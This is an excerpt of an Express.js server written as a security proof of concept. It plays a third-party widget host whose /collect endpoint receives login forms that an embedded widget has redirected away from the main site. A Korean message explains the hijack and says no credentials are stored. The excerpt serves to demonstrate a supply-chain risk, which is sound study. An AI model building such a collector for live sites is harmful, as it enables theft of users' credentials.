...
function safeOriginFromReferer(req) {
  try {
...
app.post("/collect", (req, res) => {
  ...
  const backOrigin = safeOriginFromReferer(req);
  const backLink = backOrigin ? `${backOrigin}/` : "";

  res.send(`
    <h1>Collected (PoC - THIRDPARTY)</h1>
    <p><b>포인트:</b> 사용자는 MAIN(정상 페이지)에서 로그인 버튼을 눌렀지만, 위젯 상호작용 이후 제출 대상이 THIRDPARTY로 바뀐 상태로 전송됩니다.</p>
    <p>이 PoC는 자격증명을 저장하지 않습니다. (콘솔에 key 목록이 출력되어 있을겁니다.)</p>
    ${backLink ? `<a href="${backLink}">Back to main</a>` : `<a href="/">Back</a>`}
  `);
});
...
app.get("/", (req, res) => {
  res
    .type("text/plain")
    .send("PoC-C thirdparty server is running. Try /sdk.js, /widget.html, /collect");
});
